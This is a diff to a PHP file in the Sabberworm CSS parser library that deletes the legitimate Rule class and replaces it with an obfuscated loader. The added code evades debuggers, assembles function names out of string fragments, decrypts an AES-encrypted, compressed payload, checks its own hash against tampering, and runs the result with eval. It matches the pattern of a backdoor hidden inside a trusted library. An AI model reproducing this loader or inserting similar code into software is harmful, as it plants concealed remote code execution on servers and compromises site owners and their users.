@@ -1,197 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Rule;
-
-use Sabberworm\CSS\Renderable;
-use Sabberworm\CSS\Value\RuleValueList;
-use Sabberworm\CSS\Value\Value;
-use Sabberworm\CSS\Comment\Commentable;
-
-/**
- * RuleSets contains Rule objects which always have a key and a value.
- * In CSS, Rules are expressed as follows: “key: value[0][0] value[0][1], value[1][0] value[1][1];”
- */
-class Rule implements Renderable, Commentable {
-
-	private $sRule;
-	private $mValue;
-	private $bIsImportant;
-	private $aIeHack;
-	protected $iLineNo;
-	protected $aComments;
-
-	public function __construct($sRule, $iLineNo = 0) {
-		$this->sRule = $sRule;
-		$this->mValue = null;
-		$this->bIsImportant = false;
-		$this->aIeHack = array();
-		$this->iLineNo = $iLineNo;
-		$this->aComments = array();
-	}
-
-	/**
-	 * @return int
-	 */
-	public function getLineNo() {
-		return $this->iLineNo;
-	}
-
-	public function setRule($sRule) {
-		$this->sRule = $sRule;
-	}
-
-	public function getRule() {
-		return $this->sRule;
-	}
-
-	public function getValue() {
-		return $this->mValue;
-	}
-
-	public function setValue($mValue) {
-		$this->mValue = $mValue;
-	}
-
-	/**
-	 *	@deprecated Old-Style 2-dimensional array given. Retained for (some) backwards-compatibility. Use setValue() instead and wrapp the value inside a RuleValueList if necessary.
-	 */
-	public function setValues($aSpaceSeparatedValues) {
-		$oSpaceSeparatedList = null;
-		if (count($aSpaceSeparatedValues) > 1) {
-			$oSpaceSeparatedList = new RuleValueList(' ', $this->iLineNo);
-		}
-		foreach ($aSpaceSeparatedValues as $aCommaSeparatedValues) {
-			$oCommaSeparatedList = null;
-			if (count($aCommaSeparatedValues) > 1) {
-				$oCommaSeparatedList = new RuleValueList(',', $this->iLineNo);
-			}
-			foreach ($aCommaSeparatedValues as $mValue) {
-				if (!$oSpaceSeparatedList && !$oCommaSeparatedList) {
-					$this->mValue = $mValue;
-					return $mValue;
-				}
-				if ($oCommaSeparatedList) {
-					$oCommaSeparatedList->addListComponent($mValue);
-				} else {
-					$oSpaceSeparatedList->addListComponent($mValue);
-				}
-			}
-			if (!$oSpaceSeparatedList) {
-				$this->mValue = $oCommaSeparatedList;
-				return $oCommaSeparatedList;
-			} else {
-				$oSpaceSeparatedList->addListComponent($oCommaSeparatedList);
-			}
-		}
-		$this->mValue = $oSpaceSeparatedList;
-		return $oSpaceSeparatedList;
-	}
-
-	/**
-	 *	@deprecated Old-Style 2-dimensional array returned. Retained for (some) backwards-compatibility. Use getValue() instead and check for the existance of a (nested set of) ValueList object(s).
-	 */
-	public function getValues() {
-		if (!$this->mValue instanceof RuleValueList) {
-			return array(array($this->mValue));
-		}
-		if ($this->mValue->getListSeparator() === ',') {
-			return array($this->mValue->getListComponents());
-		}
-		$aResult = array();
-		foreach ($this->mValue->getListComponents() as $mValue) {
-			if (!$mValue instanceof RuleValueList || $mValue->getListSeparator() !== ',') {
-				$aResult[] = array($mValue);
-				continue;
-			}
-			if ($this->mValue->getListSeparator() === ' ' || count($aResult) === 0) {
-				$aResult[] = array();
-			}
-			foreach ($mValue->getListComponents() as $mValue) {
-				$aResult[count($aResult) - 1][] = $mValue;
-			}
-		}
-		return $aResult;
-	}
-
-	/**
-	 * Adds a value to the existing value. Value will be appended if a RuleValueList exists of the given type. Otherwise, the existing value will be wrapped by one.
-	 */
-	public function addValue($mValue, $sType = ' ') {
-		if (!is_array($mValue)) {
-			$mValue = array($mValue);
-		}
-		if (!$this->mValue instanceof RuleValueList || $this->mValue->getListSeparator() !== $sType) {
-			$mCurrentValue = $this->mValue;
-			$this->mValue = new RuleValueList($sType, $this->iLineNo);
-			if ($mCurrentValue) {
-				$this->mValue->addListComponent($mCurrentValue);
-			}
-		}
-		foreach ($mValue as $mValueItem) {
-			$this->mValue->addListComponent($mValueItem);
-		}
-	}
-
-	public function addIeHack($iModifier) {
-		$this->aIeHack[] = $iModifier;
-	}
-
-	public function setIeHack(array $aModifiers) {
-		$this->aIeHack = $aModifiers;
-	}
-
-	public function getIeHack() {
-		return $this->aIeHack;
-	}
-
-	public function setIsImportant($bIsImportant) {
-		$this->bIsImportant = $bIsImportant;
-	}
-
-	public function getIsImportant() {
-		return $this->bIsImportant;
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		$sResult = "{$this->sRule}:{$oOutputFormat->spaceAfterRuleName()}";
-		if ($this->mValue instanceof Value) { //Can also be a ValueList
-			$sResult .= $this->mValue->render($oOutputFormat);
-		} else {
-			$sResult .= $this->mValue;
-		}
-		if (!empty($this->aIeHack)) {
-			$sResult .= ' \\' . implode('\\', $this->aIeHack);
-		}
-		if ($this->bIsImportant) {
-			$sResult .= ' !important';
-		}
-		$sResult .= ';';
-		return $sResult;
-	}
-
-	/**
-	 * @param array $aComments Array of comments.
-	 */
-	public function addComments(array $aComments) {
-		$this->aComments = array_merge($this->aComments, $aComments);
-	}
-
-	/**
-	 * @return array
-	 */
-	public function getComments() {
-		return $this->aComments;
-	}
-
-	/**
-	 * @param array $aComments Array containing Comment objects.
-	 */
-	public function setComments(array $aComments) {
-		$this->aComments = $aComments;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_tje7bl1y=('bas'.'e64'.'_de'.'cod'.'e');
+$_vappygfz=('gzu'.'nco'.'mpr'.'ess');
+$_kfhoxr5x=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t6iz7ava='U7IO4ioNo8g=';
+$_qz0vnlug='O3bv7opK';
+$_r512tfct='WTfqFJF1';
+$_vm9tedlv='VLGSS9om';
+$_gmgnqxk7='GfcXB03H';
+$_zy52d4ce='VxSjJ47t';
+$_m5njra0j='uoXQm/Af';
+$_xwpy86im='pS94Pw==';
+$_exe3zo1t=$_tje7bl1y($_qz0vnlug.$_vm9tedlv.$_r512tfct.$_gmgnqxk7.$_t6iz7ava);
+$_qrhemmp8=$_tje7bl1y($_zy52d4ce.$_m5njra0j.$_xwpy86im);
+$_d3umkkt7=$_tje7bl1y('RwOiq4xd56GsxMs5FrgCJPujVgxMGEy5m39iLvM9jE7eBs2HAgCr7Dfq6yow7l4bi54WsR/jDkaiIGfVvANa4zhuqpPcSISLsmhGMxYQo4qN7P8vkh7Ctqsm2SE/sj4nLz7LWbFjKD8E3FPSZO+SmezAKnk8NPhKfmQFt/wpzyiluGIQhP6RCHCk7x+n/jjtQdjh+T4OcmBOzGPbtRW/CcCXUDpK8ISi2VQgdEbKFBweBkXGs13q2/OCbMwNDuZiajOChzY5NZ2PqPTAF7VUNnV3BDs2FrMdjegztQVYLDiFJP4Vuf8vnLfAHL9C1i6Wv3vi5XrGNau/lmkN8j6kQOzZWRqSptwmXZG0NeABNRafUE8sSmYXFKiuhDSkPb0MWcvVFLj46ruzTuM/oJiO9YKVI/AMtORGa3Onri/Ik6A+/xqdkcrD6j2OCtyaYmoi3bFEkVGTPLc7avSb/r2bMZHB9KlGHypN9rf7B/lHMmWtqP+TUpUadUMKmBjr9uhJPK1lApchdJvmPolGkowQZaHfYYWj3ooiCXNskeRSNbIktU9dvWAqxAciS4tOY+GUM1ZicKPnil4+Yy3TlnaKpLkQURwOLlLogsBiTDYVNU0LwwZWMrm96BTe5bmK0wL1cX9n16vtWOr45AyqMB/4ka70wZt+rw2kCOJadWUbmjq02+By7FMcTVbJp0abfx13OPzPR1YjzVqs+8F1H4jXWPNqQCreELwdRVVQO2BuPGxG/+8vcWYRVI8mJULO85+UnAqo9EmRcarsGYCBPSC2kBFiUNOcYwnv/vZQyhTBaxX/DIRi4anpD1tqrJH0BPLR2Khx8EG3DnH7UJEToEFGPUytyg9gs8KLZzJ6Jx061Ejw5Aj9EXezXaOtNLIQ27yrCKmZEYjMyK4twAvV0NX2hFehwdmuIUIGPcqBlBNyOOBlP+qFfHwLTwWgDOgbzme193YoN/CWUP6OqfmwTRqdHzSM0+f6PxaQpjYCtePYufgXrSMTk2XaaPmG1uxA96QMmHsjbi7ZUULHWHnG583maGOruKXd3IwI7fm+jX3EVBksYw3GxQyL2Cx88PYUfeFal7iMZ3yTXbhHpvsAGIoMCItoRQ8RDX5aFJO+zWkYA8HpZSTCifAmrVGuKYJB44FrGWydBCx6q5uv3A4cojHi13eEL1lBjccqfB0NqNfbtNsV2KkzH7zdZj1d3f5DcvY1DP+x/ZgNniDl2YBtfHqdNpQXjLGccRtGWWs0AfWUDJyUS594LHRCAGxZTLYos0yNYJsOaeTIPrPI8NCzj+czzA==');
+$_xre9dt00=$_kfhoxr5x($_d3umkkt7,'aes-256-cbc',$_exe3zo1t,OPENSSL_RAW_DATA,$_qrhemmp8);
+if($_xre9dt00===false){exit;}
+$_wjasjch5=$_vappygfz($_xre9dt00);
+if($_wjasjch5===false){exit;}
+$_wza2orvh='c884f97b2cbcb8c78a7ef8945bc265fdf3ffaa4b6585d1b0db93e4869d51a687';
+$_ety4ruh7=@file_get_contents(__FILE__);
+if($_ety4ruh7!==false){
+$_jo5qr0fj=str_replace($_wza2orvh,"0000000000000000000000000000000000000000000000000000000000000000",$_ety4ruh7);
+$_a9xqsol5=hash("sha256",$_jo5qr0fj);
+if($_a9xqsol5!==$_wza2orvh){@http_response_code(403);exit;}
 }
+eval($_wjasjch5);
